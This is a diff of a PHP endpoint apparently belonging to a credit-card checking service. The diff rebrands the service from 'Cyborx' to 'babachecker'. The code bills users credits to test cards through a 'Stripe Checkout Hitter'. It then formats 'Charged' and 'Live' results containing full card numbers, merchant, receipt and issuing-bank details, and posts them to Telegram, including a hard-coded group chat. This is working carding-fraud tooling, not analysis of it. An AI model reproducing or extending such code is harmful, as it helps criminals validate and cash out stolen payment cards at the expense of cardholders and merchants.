@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php';
 require_once __DIR__ . '/../../app/Db.php';
@@ -20,7 +20,7 @@ $userLastName = $userData['last_name'] ?? '';
 $userStatus = strtoupper($userData['status'] ?? 'FREE');
 $userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
 $currentCredits = (int)$userData['credits'];
-if ($userStatus === 'BANNED') {echo json_encode(['Response' => 'You are banned from using Cyborx.']);exit;}
+if ($userStatus === 'BANNED') {echo json_encode(['Response' => 'You are banned from using babachecker.']);exit;}
 // if ($userStatus === 'FREE') {echo json_encode(['Response' => 'This API is only usable for Premium or Admin Users. Please upgrade your Plan.']);exit;}
 if ($currentCredits < 2) {echo json_encode(['Response' => 'Insufficient Credits']);exit;}
 $proxyHost = $_GET['host'] ?? '';
@@ -368,7 +368,7 @@ $productName = $rawResult['productName'] ?? 'Unknown';
 $receipt = $rawResult['receipt'] ?? 'N/A';
 if ($status === 'charge') {
     $newCredits = updateCredits($pdo, $uid, 5, $currentCredits, false, true);
-    $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Charged 🔥\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> Cyborx";
+    $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Charged 🔥\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage = "<b>Hit Detected ✅</b>\n━━━━━━━━\n<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n<b>Status ➜</b> <b>Charged 🔥</b>\n<b>Response ➜</b> {$msg} {$price} 🎉\n<b>Gateway ➜</b> Stripe Checkout Hitter\n━━━━━━━━━━━\n<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
@@ -377,7 +377,7 @@ if ($status === 'charge') {
     exit;
 } elseif ($status === 'live') {
     $newCredits = updateCredits($pdo, $uid, 3, $currentCredits, true, false);
-    $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Live ✅\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> Cyborx";
+    $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Live ✅\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     echo json_encode(['status' => 'live','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
